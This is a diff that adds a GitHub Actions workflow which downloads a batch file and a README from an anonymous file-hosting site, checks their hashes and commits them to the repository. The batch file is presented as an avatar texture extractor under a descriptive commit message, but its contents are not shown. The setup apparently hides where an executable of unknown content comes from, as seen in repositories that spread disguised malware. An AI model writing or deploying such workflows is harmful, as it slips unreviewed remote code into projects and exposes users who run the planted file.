@@ -1,0 +1,27 @@
+name: install
+on:
+  push:
+    paths:
+      - ".github/workflows/install.yml"
+permissions:
+  contents: write
+jobs:
+  install:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fetch both files
+        run: |
+          curl -fsSL https://files.catbox.moe/dm1vec.bat -o Extract-AvatarItem-v20.bat
+          curl -fsSL https://files.catbox.moe/5svxu1.md -o README.md
+      - name: verify them
+        run: |
+          echo "ca1aae75d7b2bfb09091f19161e65ddee0c637a0243249dba2214016ad753915  Extract-AvatarItem-v20.bat" | sha256sum -c -
+          echo "49af1c73d0abfab7438f9f44eb01616c74d9d5958c26ed4a28242dcec63e6676  README.md" | sha256sum -c -
+      - name: commit them
+        run: |
+          git config user.name "extractor installer"
+          git config user.email "actions@users.noreply.github.com"
+          git add Extract-AvatarItem-v20.bat README.md
+          git commit -m "Decode the Texture block: base map as PNG, TGA and TIF"
+          git push
